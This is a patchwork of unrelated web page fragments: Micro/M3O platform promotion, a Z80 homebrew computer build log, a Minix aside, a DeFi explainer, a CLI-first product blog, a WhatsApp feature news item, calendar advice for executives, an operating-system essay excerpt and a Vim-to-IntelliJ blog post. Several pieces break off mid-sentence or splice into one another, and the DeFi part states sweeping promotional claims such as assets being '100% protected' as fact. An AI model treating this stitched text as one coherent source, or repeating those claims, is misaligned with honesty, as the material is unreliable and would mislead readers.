for the persistence, that they are identified by name rather than IP address and they themselves provide an 
API that can be consumed by multiple clients such as web, mobile and cli or other services.</p>

<p>Cloud native applications are horizontally scalable and operate within domain boundaries that divide them as 
separate apps which communicate over the network via their APIs rather than as one monolithic entity. 
We think cloud services require a fundamentally different approach to software creation and why Micro 3.0 
was designed with this in mind.</p>

<h2 id="micro-30-aka-m3o">Micro 3.0 aka M3O</h2>

<p>Micro 3.0 (M3O) reimagines Micro as a platform for cloud native development. What does that mean? Well we think of 
it as PaaS 3.0, a complete solution for source to running and beyond. Micro has moved from just being a Go 
framework to incorporating a standalone server and hosted platform. Our hosted offering is called 
<a href="https://m3o.com/">M3O</a>, a hat tip to Micro 3.0 or M[icr]o, whichever way you want to see it.</p>

<p>Another way to think about it. What Git is to GitHub, Micro is to the M3O platform. Let’s dig into it.</p>

<p>Micro 3.0 includes the following.</p>

<h3 id="server">Server</h3>

<p>The server is our abstraction for cloud infrastructure and underlying systems you might need for writing 
distributed systems. The server encapsulates all of these concerns as gRPC services which you can 
query via any language. The goal here is to say developers don’t really need to be thinking about infrastructure 
but what they do need is design patterns and primitives for building distributed systems.</p>

<p>The server includes the following:</p>

<ul>
  <li>
    <p><strong>Authentication</strong>: Auth whether its authentication or authorization is part of the system. Create JWT tokens, define access rules, use one system to govern everything in a simple and straight forward manner. Whether it’s for a user or a service.</p>
  </li>
  <li>
    <p><strong>Configuration</strong>: Dynamic config management allows you to store relevant config that needs to be updated without having to restart services. Throw API keys and business logic related configuration into the secure config service and let your services pick up the changes.</p>
  </li>
  <li>
    <p><strong>Key-Value Storage</strong>: We’re focused on best practices for microservices development which means keeping services mostly stateless. To do this we’re providing persistent storage on the platform. Key-Value allows you to rapidly write code and store data in the format you care about.</p>
  </li>
  <li>
    <p><strong>Event Streaming</strong>: Distributed systems are fundamentally in need of an event driven architecture to breakdown the tight dependencies between them. Using event streaming and pubsub allows you to publish and subscribe to relevant events async.</p>
  </li>
  <li>
    <p><strong>Service Registry</strong>: Micro and M3O bake in service discovery so you can browse a directory of services to explore your service APIs and enable you to query services by name. Micro is all about microservices and multi-service development.</p>
  </li>
  <li>
    <p><strong>Service Network</strong>: Because you don’t want to have to resolve those service names to addresses and deal with the load balancing aspect, the server bakes in a “service mesh” which will handle your inter-service requests (as gRPC) and route to the 
appropriate instance.</p>
  </li>
  <li>
    <p><strong>Identity Proxy</strong>: We include a separate identity proxy for external requests using gRPC via the CLI and other means. This enables you to query from your local machine or anywhere else using valid auth credentials and have it seamlessly work as if 
you were in the platform itself.</p>
  </li>
  <li>
    <p><strong>API Gateway</strong>: Finally there’s an API gateway that automatically exposes your services to the outside world over HTTP. Internally writing service to service using gRPC makes sense, but at the end of the day we want to build APIs consumed from clients via HTTP.</p>
  </li>
</ul>

<h3 id="clients">Clients</h3>

<p>The server provides inter-service communication and two means of external communication with a HTTP API and gRPC proxy but that 
experience is made much better when there’s user experience on the client side that works. Right now we’ve got two ways of doing this.</p>

<ul>
  <li>
    <p><strong>Command Line</strong>: The CLI provides a convenient and simple way to talk to the server via gRPC requests through the proxy. 
The most convenient commands are builtin but every service you write also gets beautiful dynamic generated commands 
for each endpoint.</p>
  </li>
  <li>
    <p><strong>gRPC SDKs</strong>: Every service in the server is accessible via gRPC. We’re code generating clients for the server itself 
so you can access them from any language. What this enables is a wide array of experiences on the client side without 
having to handcraft libraries for each language.</p>
  </li>
  <li>
    <p><strong>Web Interface</strong>: Coming soon is a dynamically generated web interface that creates a simple query mechanism through a 
browser for any of your services. We’ve got a http api, gRPC proxy and command line interface but feel like the browser 
could use some love too.</p>
  </li>
</ul>

<h3 id="framework">Framework</h3>

<p>One thing we really understood from our time working on go-micro was that the developer experience really …</p></div></div>

<h2>A Z80 standalone computer with memory-mapped display and keyboard interface</h2>
<img src="http://www.cpuville.com/Projects/Standalone-Z80-computer/images/video-system.jpg" alt="photo of the system with keyboard and monitor" width="600">
<p>I have made and sold Z80 computer systems with a serial port, so that you can do text input and output using a dumb 
terminal or a terminal emulation program on a PC. This is like the early PCs that were designed to work with CP/M, which 
was the operating system of choice for business applications.</p> 
<p>However, many of the early 8-bit computers meant for home use had built-in keyboards and displays, or produced 
a composite video output so that a TV or simple video monitor could be used as the display, like the Apple II, 
TRS-80, and Commodore 64. These computers were designed with video game playing in mind, and had some form of 
a memory-mapped display to allow this. Many people have asked me if I could make a similar computer, which, 
because it is not dependent on a separate terminal for input and output, may be called a standalone computer. 
I started on a project to make a standalone computer about a year ago, and this page documents the results 
and what I have learned along the way.</p>
<h3>Overview of the system</h3>
<img src="http://www.cpuville.com/Projects/Standalone-Z80-computer/images/video-system-2.jpg" alt="closeup of the system boards" width="600">
<p>The standalone computer has a Z80 B processor overclocked to run at 8 MHz, which it handles fine. The memory space 
is divided into 8 kilobytes (KB) of ROM and 56 kilobytes of RAM. The RAM space includes 9600 bytes of video RAM (VRAM) 
from addresses 8000h to A580h. The entire RAM space is accessible to the processor. The ROM includes a system monitor 
similar to that used in the <a href="http://www.cpuville.com/Kits/Single-board-kit.html">CPUville Single-board Z80 computer</a>, 
with the exception that the commands for reading and 
writing the disk have been removed, and code to manage the video display and keyboard interface have been added. 
The computer produces composite black-and-white video output at  
60 frames per second, with a resolution of 320 by 240 dots. The computer has a keyboard interface

from a PC. Schematic images of the computer system and the keyboard interface are here:</p>

<h3>The video display</h3>
<p>The most daunting challenge was making the video display. I was about to look on the internet to see how people have done 
this, but a friend (thanks, Paulo!) said I would learn more if did not copy anybody else's design and just came up with my 
own. So that is what I did. I started with a description of the composite video signal and worked backward to make a 
circuit that would produce 
the signal and display images stored in memory. If you look at my schematics and see things that I could have done a 
different way, feel free to let me know, but I think I got it mostly right.</p>
<p>There are limits on the resolution of a composite video signal. I decided to try for a 320 by 240 pixel resolution, in 
black and white, which is close to the upper limit of what these displays can produce. To get 320 dots on a line, given that 
a composite video line is drawn in about 53 microseconds, I needed a maximum dot time of about 53/320 = 0.165 microseconds, 
or a minimum dot frequency of 1/0.165 = 6.06 MHz. I used an 8 MHz oscillator for the video display and this worked well.</p>
<p>The composite video output signal voltage specification ranges between 0 and +3V, so I needed to make a circuit to 
produce the required voltage 
levels from the TTL signals produced by the video display logic. I used a voltage divider and some generic NPN transistors 
to produce the levels for a white dot, a black dot (blank), and a synch level. This worked well except the black dots were 
elongated to the right (the direction the electron beam in the display is traveling). Using the oscilloscope I could see 
that the video transistor was turning on sharply, but turning off slowly. I considered using a faster specialized transistor, 
but looking around I came across a simple fix to this problem called the <a href="https://en.wikipedia.org/wiki/Baker_clamp">Baker clamp</a>:</p>
<img src="http://www.cpuville.com/Projects/Standalone-Z80-computer/images/video-output-schematic.jpg" alt="schematic of the video output circuit" width="600">
<p>This is simple a Schottky diode 
(low forward voltage threshold) connected between the base and collector of the video transistor. This diode has the 
effect of taking some charge off of the base as the transistor comes on so that the base does not become heavily saturated. 
Then, when the transistor turns off, it has only a little charge to shed, and goes off quickly. This resulted in much 
better dot resolution. I did not need the Baker clamp for the synch level transistor, because this pulse is not really 
sensitive to a slightly slow transistor turn-off.</p>
<p>The digital signals required for the display are the synch pulses and the video signal itself (the dots). There are two 
synch pulses. The horizontal synch pulse is a 0V pulse that lasts 4.7 microseconds and is produced every 63.5 microseconds, 
for a line rate of 15.7 kHz. The vertical synch pulse is a 0V pulse that lasts 3 line-times and is produced every 16.6 
milliseconds (for a frame rate of 60 per second). The video signal runs at a rate of 8 MHz, with each dot either on (white) 
or off (black).</p>
<p>I produce the synch signals by using counters. I feed the 8 MHz dot clock signal into the counters, and use logic to trigger 
flip-flops at certain dot counts corresponding to the times to start a pulse and stop a pulse. This works well. The counters 
are ordinary binary counters (not synchronous). The counter logic also resets the counters at the appropriate dot counts. 
The synch pulse counters also produce signals to turn the video display on and off at appropriate dot counts. 
Here is a summary of the signals produced by the line and frame logic circuits:</p>
<pre><tt>	     Line logic	
Signal pulse		Pixel number, dec
HSYNC on		12
HSYNC off		49
RAM2 off bus		132
Display on		136
Display off		456
RAM2 on bus		460
Pixel Counter reset	508
  
	     Frame logic	
Signal pulse		Line number, dec
RAM2 off bus		6
Display on		7
Display off		247
RAM2 on bus		248
VSYNC on		254
VSYNC off		257
Line counter reset	263</tt></pre>
<p>The video portion of the display circuit is an 8-bit shift register which takes bytes from the video display memory 
and produces a stream of bits that correspond to the bit pattern in the byte. The shift register is run using the 
8 MHz oscillator as the shift clock. The shift register is "on" all the time. When the video display is on (when bytes 
are being fed to the shift register), the video 
memory was puts a byte into the shift register every 8 dot clock counts, and when the video display is off the shift register is 
putting out a stream of zeros.</p>
<p>The signal for the shift register to load bytes is a little complicated. The idea is to load a byte every 8 counts, 
and a small divide-by-8 logic circuit on the counter outputs produces this signal:</p>
<img src="http://www.cpuville.com/Projects/Standalone-Z80-computer/images/load-byte-schematic.jpg" alt="schematic of the load byte circuit" width="600">
<p>But there is a significant delay 
between when the VRAM address is incremented, and the new byte is displayed on the VRAM data outputs, so the divide-
by-8 circuit produces the pulse a few counts after the three least-significant counter bits reach zero.</p>
<p>The timing of the shift register load pulse is critical. The new byte needs to be loaded into the shift register 
at exactly the right time, or else there will be a blurred image. This is because the shift register will immediately 
output the most-significant bit of the loaded byte, so if the byte is not loaded while the shift pulse is active, 
that dot will be missing from the output. I solved this by using an adjustable delay circuit. A trimmer capacitor in 
an R-C delay circuit can be adjusted so that the bytes are loaded right when a shift pulse is active. I used a test 
pattern with every other dot on (binary 0101 0101, or 55 hexadecimal) during adjustment.</p>  
<p>Connecting the video display memory (video RAM, VRAM) was another complicated problem. The VRAM has to be connected to 
the system address and data buses when the CPU is placing data into it, but connected to the video display when putting 
dots onto the screen. When connected to the display, the VRAM gets its address from a byte counter, which is incremented 
every 8 dots and is reset when the end of the display frame is reached. A multiplexer selects an address from either the 
system address bus or the display byte counter, depending on a signal derived from the synch pulse outputs. Basically, 
the system will allow the CPU to put data into the VRAM only during the synch pulse intervals. During the time that the 
display is on, the system generates a WAIT input to the CPU if the CPU wants to read or write to an address in the VRAM 
range. The VRAM data bus is connected directly to the display shift register, and to the system data bus through a 
bi-directional buffer. The synch pulse signals control this data bus buffer so that it is open only during the synch pulse 
time, when the display is off.</p>
<p>One other small thing is a hardware interrupt from a slow (about 6 Hz) R-C oscillator circuit that is used to provide 
timing for the cursor blink and a power-on delay to allow the keyboard to intialize.</p>
<h3>The keyboard interface</h3>
<p>The keyboard interface hardware is pretty simple. I built a one-way interface (keyboard to CPU) to reduce hardware. This means 
that one cannot send commands to the keyboard to do things like turn on the caps lock LED or alter the key repeat frequency, 
but I think the trade-off acceptable for this project. The signal from a PS-2 keyboard is an 11-bit serial word, which has 
one start bit, 8 data bits, one parity bit, and one stop bit. I used two 8-bit serial-to-parallel shift registers in tandem 
to capture the 11 bits, polling bit 5 in the second register to see when the start bit arrived there. That would mean that 
the contraption had received the full 11-bit word. Then I could read each register, and extract the 8-bit data. This 
data byte is not a character code, but rather a keyboard scan code, which indicates which key has been pressed. The ROM 
software translates this character code into ASCII.</p>

<p>
On Fish Disk 525, there's a disk image containing a demo version of
Minix 1.5 from 1991. Back in those days it wasn't free as in speech, but it had
some significance in boosting GPL anyways: This was roughly the version Linus
Torvalds used when he started his work on the Linux kernel. While
it might at this point have been of academic interest, Minix certainly
provided for a rather crude user experience, even by *nix-like text mode
standards. It was hardly an improvement on the Amiga, which already provided
32-bit preemptive multitasking, a powerful command line and a beautifully
coherent desktop metaphor.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Decentralized finance (DeFi) is a kind of independent and interconnected financial services pool that is built with the help of smart contracts and blockchain technology.</p>
<p><a href="https://getblock.io/blog/what-is-defi">DeFi</a> is not a token or crypto wallet, but rather a decentralized finance concept, an ecosystem where blockchains and digital assets are integrated with traditional financial institutions. The decentralized financing system's relevance grows rapidly in 2020. And the reason for this serious problem is the global financial systems issues due to the Covid-19 pandemic.</p>
<p>DeFi is seen as an alternative to fiat monetary policy. The only difference with <a href="https://getblock.io/blog/what-is-defi">DeFi</a> is that the entire system is decentralized, which means that banks or central authorities don’t control it.</p>
<h3 id="what-are-defi-projects">What are DeFi projects?</h3>
<p>Any decentralized commercial financial service can be considered a DeFi project.</p>
<p>Projects are not managed by any particular organization or its employees. Instead, the rules of operation are written in code or smart contracts. The code is transparent, everyone can track the details of ongoing transactions.</p>
<h3 id="benefits-of-decentralized-finance">Benefits of decentralized finance:</h3>
<ol>
<li>Autonomy. Only you possess your money and assets in the DeFi ecosystem. No one can block your account or seize assets and block transactions.</li>
<li>Decentralization. There is no need for intermediaries. Transactions are carried out directly.</li>
<li>The transactions are fast and inexpensive.</li>
<li>Secure private key.</li>
<li>The ecosystem’s transparency where personal interests are governed by a transparent protocol.</li>
<li>Single points of failure are eliminated. Data is written to the blockchain and distributed across thousands of nodes, making it nearly impossible to shut down services.</li>
</ol>
<h3 id="where-defi-projects-are-applied">Where DeFi Projects Are Applied?</h3>
<ul>
<li>Creation of monetary banking services (for example, issuing stable coins).</li>
<li>Providing peer-to-peer or pooled lending and borrowing platforms.</li>
<li>Leveraging advanced financial instruments, tokenization platforms, derivatives, and forecast markets.</li>
</ul>
<h3 id="key-features-of-defi-dapp">Key Features of DeFi dApp</h3>
<ul>
<li>Decentralized P2P channel.</li>
<li>The dApp user connects his crypto wallet to the decentralized blockchain network.</li>
<li>Assets are 100% protected and there is no user asset manager.</li>
<li>All transactions, application processes are processed by smart contracts, the participation of a third party is excluded.</li>
<li>No access restrictions.</li>
</ul>
<h3 id="popular-defi-projects">Popular DeFi Projects?</h3>
<ul>
<li>Open lending protocols</li>
<li>Stablecoins</li>

            <div>
                <p>At the start of this hectic year I have joined <a href="https://m3o.com/">Micro</a>, an open source microservices platform. The company was born out of a <a href="https://github.com/asim/nitro">Go framework</a>. We took the concepts of the framework - interfaces for service discovery, configuration and other pieces which can run on any implementation (from mdns locally to kubernetes) and provide a live platform version of it. It’s kind of like Netlify, but for the backend.</p>

<p>Once we were happy with the local development flow for the micro server and CLI, we decided to start selling the product as a platform. Building a website seemed like an obvious step to do. It’s 2020 right?</p>

<p>So we got to work. Metrics with nice charts. Tracing. Calling services. Listing endpoints.
It was all shaping up nicely. But slowly and surely we started missing features we got accustomed to on the frontend in the CLI. Being very heavy command line users, whenever we got something available in the CLI, we reached there first.</p>

<p>And then we realised. Who are we building this frontend exactly and why? We prefer the command line. And none of our many thousands of users were asking for a web UI. At most it was considered a “cool” thing to have.</p>

<p>The past three decades have been all about the world wide web (www) and in that we’ve gone through the multiple iterations
of building “web first” experiences which I’d argue really peaked in the Web 2.0 era in the mid 00s with the likes of
Facebook and others. At some point we entered the “Mobile first” era and yet for developers, Web still became a horrible
platform we were stuck with for any platform or tools, AWS is a great example of how to get it really wrong.
If new products and platforms are going Mobile first, maybe we as developers need to go CLI first. So here it is. M3O
is a CLI first experience. No context switches, no ugly dashboards, just a simple straight forward command line utility
that gets out of your way when you need it to.
Our hope at Micro is more learn from this experience and do away with Web UIs entirely. Challenge every assumption you know
about Web for backend development and think, do I really need that, or is it better served as a single CLI experience.</p>

<p>So we doubled down. We entirely sidelined the web UI and decided payment will be the only thing on the website, should supplying card details in the terminal feel sketchy.</p>

<p>What we found after this surprised us. By limiting our choices we unleashed a storm of ideas on how to improve the single medium we can express our thoughts in.</p>

<p>We started to make service call feel just like any command invocation.</p>

<p>What was previously</p>

<div><div><pre><code>micro call servicename endpoint <span>'{"field":"value","otherfield":{"subfield":"value2"}}'</span>
</code></pre></div></div>

<p>became</p>

<div><div><pre><code>micro servicename endpoint <span>--field</span><span>=</span>value <span>--otherfield_subfield</span><span>=</span>value2
</code></pre></div></div>

<p>On the surface it might not seem much, but when you are living and breathing these commands it provides a great satisfaction to remove even little frictions.</p>

<p>New services and their endpoints feel just like builtin Micro commands, which is why our invites simply became</p>

<div><div><pre><code>micro invite user <span>--email</span><span>=</span>someone@domain.com
</code></pre></div></div>

<p>Shipping features to end users became as deploying a new service, and users can easily programatically call their endpoints from the terminal.</p>

<p>Bash shines at quick and information dense throwaway scripts, so our <a href="https://github.com/micro/micro/tree/master/test">end to end test framework</a> is built for tests to be written using Micro CLI commands.</p>

<p>We dream of a future where programming is as close to natural languages as possible.
At the moment, the ubiquity of bash provides a great layer for us to quickly interact with microservices. It truly feels like the platform is alive as nouns and verbs are being created by service writers to be composed into sentences.</p>

<p>Why don’t you <a href="https://m3o.com/">give it a go</a>? We have a free tier ;).</p>

<p><span>WhatsApp disappearing messages features is finally officially <a href="https://blog.whatsapp.com/introducing-disappearing-messages-on-whatsapp/?lang=en">announced</a> by Whatsapp and it’ll soon be rolling out to both iOS and Android devices.</span></p>

</blockquote>

<p><span>The feature, once enabled, will allow you to send messages to your WhatsApp contacts that will automatically disappear in 7 days.</span></p>

<figure><span><img data-src="https://theusefultech.com/wp-content/uploads/2020/05/whatsapp-892926_1920-1024x682.jpg" alt="WhatsApp disappearing messages" width="1024" height="682" data-old-src="image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" src="https://theusefultech.com/wp-content/uploads/2020/05/whatsapp-892926_1920-1024x682.jpg"></span></figure>

<p><span>You can send disappearing messages in WhatsApp to both individual contacts and in group chats.</span></p>

<p><span>While you can turn on or off the disappearing messages in individual chats, only the group admins are allowed to do that in group chats.</span></p>

<p><span>People can still take screenshots or copy the disappearing messages within the 7 day period, so WhatsApp warns you to only use this feature with trusted people.</span></p>
<h2><span><strong>How does WhatsApp disappearing messages work</strong></span></h2>

<p><span>According to WhatsApp, the disappearing messages in WhatsApp works in the following ways:</span></p>

<ul>
<li><span>If a user doesn’t open WhatsApp in the seven day period, the message will disappear. However, the preview of the message might still be displayed in notifications until WhatsApp is opened.</span></li>
<li><span>When you reply to a message, the initial message is quoted. If you reply to a disappearing message, the quoted text might remain in the chat after seven days.</span></li>
<li><span>If a disappearing message is forwarded to a chat with disappearing messages off, the message won’t disappear in the forwarded chat.</span></li>
<li><span>If a user creates a backup before a message disappears, the disappearing message will be included in the backup. Disappearing messages will be deleted when a user restores from a backup.</span></li>
</ul>

<p><span>However, media sent to the chats will be saved to your phone if automatic download is enabled even if the media file will be disappearing from the chat in 7 days.</span></p>

<h3><span><strong><span>When will you get the feature?</span></strong></span></h3>
<p><span>The feature is expected to roll out to the stable versions of WhatsApp in Android and iOS across the world in the coming weeks.</span></p>
<p><span>If you are a beta user of WhatsApp you might already be able to get access to the disappearing messages feature from the chat settings.</span></p>

<p>Time is the one resource that we cannot readily get more of. Alan Weiss always says that you can make another dollar, but you cannot make another minute. Time is of the essence, especially for executives. There are only so many work hours in the day, and you want to make the biggest impact on your team and your company.</p>



<p>However, I won’t go into simple time management techniques, as I’ve <a href="https://www.techexecpodcast.com/episodes/the-calendar-reset-refresh">described in the past</a>. In this article, I want to help you make a paradigm shift from reporting to your calendar to taking ownership of it. Right now, you—like most of your peers—are enslaved to your calendar. It is not a service, but something you serve. The calendar tells you what you need to do, and you listen. The notification lights up your phone screen, and you shuffle along to the next conference room or fire up your Zoom call.</p>



<p>You’ve probably heard that our email inbox is terrible, as it is essentially a todo list that anyone in the world can add items to. The calendar is even worse. Anyone in your company can send you an invite and not just add a todo item. They also decide when and how long it’s going to take. What do we say to the god of time sinks? <em>Not today</em>.</p>



<p>Your time is yours. You should prioritize it to comply with your goals and objectives. Rather than defaulting to having a wide-open calendar, set your initial position to be more favorable for you. While executives do a significant amount of their work in meetings, you still need to have time to think, plan, and handle your own work. You cannot let that be postponed indefinitely or until matters become urgent.</p>



<p>Take ownership of your time and make the time to do what is most important for maximizing your value and impact:</p>



<ul><li>Create office hours. There’s nothing wrong with protecting your mornings for quiet thinking time if you discovered that’s when you are most productive.</li><li>Embrace asynchronicity. Teach those you work closely with to write down their asks and arguments. You don’t have to have a meeting for every single thing. One well-written email can save hours of meetings.</li><li>Delegate. Just because someone asked you to be at a meeting, it doesn’t mean that’s the right thing to do.</li><li>Be protective of your time. If you feel like you are drowning, or do not have enough time to do the critical stuff—stop. Don’t do yourself and your team a disservice. You have to get your things in order before you can help your team.</li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p> About twenty years ago Jobs and Wozniak, the founders of Apple, came
up with the very strange idea of selling information processing machines
for use in the home. The business took off, and its founders made a lot of
money and received the credit they deserved for being daring visionaries.
But around the same time, Bill Gates and Paul Allen came up with an idea
even stranger and more fantastical: selling computer operating systems.
This was much weirder than the idea of Jobs and Wozniak. A computer at
least had some sort of physical reality to it. It came in a box, you could
open it up and plug it in and watch lights blink. An operating system had
no tangible incarnation at all. It arrived on a disk, of course, but the
disk was, in effect, nothing more than the box that the OS came in. The
product itself was a very long string of ones and zeroes that, when
properly installed and coddled, gave you the ability to manipulate other
very long strings of ones and zeroes. Even those few who actually
understood what a computer operating system was were apt to think of it as
a fantastically arcane engineering prodigy, like a breeder reactor or a
U-2 spy plane, and not something that could ever be (in the parlance of
high-tech) "productized." 

</p><p> Yet now the company that Gates and Allen founded is selling operating
systems like Gillette sells razor blades. New releases of operating
systems are launched as if they were Hollywood blockbusters, with
celebrity endorsements, talk show appearances, and world tours. The market
for them is vast enough that people worry about whether it has been
monopolized by one company. Even the least technically-minded people in
our society now have at least a hazy idea of what operating systems do;
what is more, they have strong opinions about their relative merits. It is
commonly understood, even by technically unsophisticated computer users,
that if you have a piece of software that works on your Macintosh, and you
move it over onto a Windows machine, it will not run. That this would, in
fact, be a laughable and idiotic mistake, like nailing horseshoes to the
tires of a Buick. 

</p><p> A person who went into a coma before Microsoft was founded, and woke
up now, could pick up this morning's New York Times and understand
everything in it--almost: 

</p><ul>
<li>Item: the richest man in the world made his fortune
     from-what? Railways? Shipping? Oil? No, operating systems.
</li><li>Item: the Department of Justice is tackling Microsoft's
     supposed OS monopoly with legal tools that were invented to
     restrain the power of Nineteenth-Century robber barons.
</li><li>Item: a woman friend of mine recently told me that she'd
     broken off a (hitherto) stimulating exchange of e-mail with
     a young man. At first he had seemed like such an intelligent
     and interesting guy, she said, but then "he started going
     all PC-versus-Mac on me."
</li></ul>

<p> What the hell is going on here? And does the operating system business
have a future, or only a past? Here is my view, which is entirely
subjective; but since I have spent a fair amount of time not only using,
but programming, Macintoshes, Windows machines, Linux boxes and the BeOS,
perhaps it is not so ill-informed as to be completely worthless. This is a
subjective essay, more review than research paper, and so it might seem
unfair or biased compared to the technical reviews you can find in PC
magazines.  But ever since the Mac came out, our operating systems have
been based on metaphors, and anything with metaphors in it is fair game as
far as I'm concerned. 


</p><p>MGBs, TANKS, AND BATMOBILES

</p><p> Around the time that Jobs, Wozniak, Gates, and Allen were dreaming up
these unlikely schemes, I was a teenager living in Ames, Iowa. One of my
friends' dads had an old MGB sports car rusting away in his garage.
Sometimes he would actually manage to get it running and then he would
take us for a spin around the block, with a memorable look of wild
youthful exhiliration on his face; to his worried passengers, he was a
madman, stalling and backfiring around Ames, Iowa and eating the dust of
rusty Gremlins and Pintos, but in his own mind he was Dustin Hoffman
tooling across the Bay Bridge with the wind in his hair. 

</p><p> In retrospect, this was telling me two things about people's
relationship to technology. One was that romance and image go a long way
towards shaping their opinions. If you doubt it (and if you have a lot of
spare time on your hands) just ask anyone who owns a Macintosh and who, on
those grounds, imagines him- or herself to be a member of an oppressed
minority group. 

</p><p> The other, somewhat subtler point, was that interface is very
important. Sure, the MGB was a lousy car in almost every way that counted:
balky, unreliable, underpowered. But it was fun to drive. It was
responsive. Every pebble on the road was felt in the bones, every nuance
in the pavement transmitted instantly to the driver's hands. He could
listen to the engine and tell what was wrong with it. The steering
responded immediately to commands from his hands. To us passengers it was
a pointless exercise in going nowhere--about as interesting as peering
over someone's shoulder while he punches numbers into a spreadsheet. But
to the driver it was an experience. For a short time he was extending his
body and his senses into a larger realm, and doing things that he couldn't
do unassisted. 

</p><p> The analogy between cars and operating systems is not half bad, and so
let me run with it for a moment, as a way of giving an executive summary
of our situation today. 

</p><p> Imagine a crossroads where four competing auto dealerships are
situated. One of them (Microsoft) is much, much bigger than the others. It
started out years ago selling three-speed bicycles (MS-DOS); these were
not perfect, but they worked, and when they broke you could easily fix
them. 

</p><p> There was a competing bicycle dealership next door (Apple) that one
day began selling motorized vehicles--expensive but attractively styled
cars with their innards hermetically sealed, so that how they worked was
something of a mystery. 

</p><p> The big dealership responded by rushing a moped upgrade kit (the
original Windows) onto the market. This was a Rube Goldberg contraption
that, when bolted onto a three-speed bicycle, enabled it to keep up, just
barely, with Apple-cars. The users had to wear goggles and were always
picking bugs out of their teeth while Apple owners sped along in
hermetically sealed comfort, sneering out the windows. But the
Micro-mopeds were cheap, and easy to fix compared with the Apple-cars, and
their market share waxed. 

</p><p> Eventually the big dealership came out with a full-fledged car: a
colossal station wagon (Windows 95). It had all the aesthetic appeal of a
Soviet worker housing block, it leaked oil and blew gaskets, and it was an
enormous success. A little later, they also came out with a hulking
off-road vehicle intended for industrial users (Windows NT) which was no
more beautiful than the station wagon, and only a little more reliable. 

</p><p> Since then there has been a lot of noise and shouting, but little has
changed. The smaller dealership continues to sell sleek Euro-styled sedans
and to spend a lot of money on advertising campaigns. They have had GOING
OUT OF BUSINESS! signs taped up in their windows for so long that they
have gotten all yellow and curly. The big one keeps making bigger and
bigger station wagons and ORVs. 

</p><p> On the other side of the road are two competitors that have come along
more recently. 

</p><p> One of them (Be, Inc.) is selling fully operational Batmobiles (the
BeOS). They are more beautiful and stylish even than the Euro-sedans,
better designed, more technologically advanced, and at least as reliable
as anything else on the market--and yet cheaper than the others. 

</p><p> With one exception, that is: Linux, which is right next door, and
which is not a business at all. It's a bunch of RVs, yurts, tepees, and
geodesic domes set up in a field and organized by consensus. The people
who live there are making tanks. These are not old-fashioned, cast-iron
Soviet tanks; these are more like the M1 tanks of the U.S. Army, made of
space-age materials and jammed with sophisticated technology from one end
to the other.  But they are better than Army tanks. They've been modified
in such a way that they never, ever break down, are light and maneuverable
enough to use on ordinary streets, and use no more fuel than a subcompact
car. These tanks are being cranked out, on the spot, at a terrific pace,
and a vast number of them are lined up along the edge of the road with
keys in the ignition. Anyone who wants can simply climb into one and drive
it away for free. 

</p><p> Customers come to this crossroads in throngs, day and night.  Ninety
percent of them go straight to the biggest dealership and buy station
wagons or off-road vehicles. They do not even look at the other
dealerships. 

</p><p> Of the remaining ten percent, most go and buy a sleek Euro-sedan,
pausing only to turn up their noses at the philistines going to buy the
station wagons and ORVs. If they even notice the people on the opposite
side of the road, selling the cheaper, technically superior vehicles,
these customers deride them cranks and half-wits. 

</p><p> The Batmobile outlet sells a few vehicles to the occasional car nut
who wants a second vehicle to go with his station wagon, but seems to
accept, at least for now, that it's a fringe player. 

</p><p> The group giving away the free tanks only stays alive because it is
staffed by volunteers, who are lined up at the edge of the street with
bullhorns, trying to draw customers' attention to this incredible
situation. A typical conversation goes something like this: 

</p><p> Hacker with bullhorn: "Save your money! Accept one of our free tanks!
It is invulnerable, and can drive across rocks and swamps at ninety miles
an hour while getting a hundred miles to the gallon!" 

</p><p> Prospective station wagon buyer: "I know what you say is
true...but...er...I don't know how to …</p></div></div>

<h2>In the beginning, a love affair</h2>
<p>For the last 10 years or so, I have been a die-hard Vim user. I was introduced to Vim on my first programming job. It was almost an instant connection for me. I fell in love with the minimalism of only needing a terminal to do work; and the power of stringing together commands, like words, to edit programs and text.</p>
<p>The love affair I have with Vim stuck with me throughout my career and remains strong to this very day. When I was a junior-level release engineer, working on small scripts, Vim was amazing. Later, working as a Ruby on Rails Engineer, Vim was still an amazing editor. Thoughtbot, Hashrocket, and countless other agencies, companies, and individuals contributed to the community (and cult) of Vim. That community pushed my knowledge, comfort, and understanding further and further.</p>
<p>Eventually, I was running tmux and Vim together in the terminal. With sufficient plugins and dotfiles, I was CRUISING through codebases. I could write tests, run them, refactor code, and run commands with absolute ease.</p>

<center><i>Vim and tmux... were so amazing</i></center>
<hr>
<h2>Old feelings fade</h2>
<p>Lately, though, I have been feeling a little underwhelmed by Vim. Even with my sophisticated dotfiles, knowledge, and Plugin setup; something felt off. I started a new job working on a large typescript React project. Vim couldn’t handle opening a TSX file larger than 50 lines without crashing.</p>
<p>Within the last few years, I tried my hand at programming mobile applications. Flutter and Dart — although supported by an LSP — was not running very well on my Vim setup. After giving Android Studio a shot with Flutter, it felt like a whole new world.</p>

<center><i>Android Studio was a game changer</i></center>
<hr>
<p>All of a sudden, I had everything at my fingertips. Auto completion, Auto formatting, snippets, and documentation lookup was all set <strong>By Default</strong>. I actually understood the Flutter framework much better because Android Studio made deep framework code easy to debug, inspect, and explore. Not to mention, the Vim integration was <strong>fantastic</strong>. This was the best of both worlds. I had amazing editing, minimal configuration, and Vim keybindings!</p>
<p>When picking up a new language or framework in Vim, I would spend hours configuring plugins, dealing with linting, and looking up documentation. With and IDE like Android Studio, all of this came pre-built without any configuration.</p>
<p>Android Studio was something of a revelation for me. I began thinking to myself, “If this is so great for Flutter, wouldn’t this be great for my other projects?“.</p>
<h2>Vim to VSCode to Webstorm to IntelliJ</h2>
<p>I am now working almost exclusively on IntelliJ IDEA. It is the JetBrains defacto editor that includes plugins for almost anything:</p>
<ul>
<li>Ruby on Rails</li>
<li>Ember</li>
<li>Angular</li>
<li>Typescript</li>
<li>React</li>
<li>The list literally goes on forever</li>
</ul>
<p>Every project I work on — like this Gatsby blog in React, my corporate Typescript React job, or my Ruby on Rails side projects — All work within this one editor.</p>
<p>I had a brief stint with VSCode but, to me, it appeared to have the same flaws I disliked with Vim at the time. It was slow with large files, and it felt sluggish with complicated programs and complicated programming languages (like typescript and tsserver).</p>
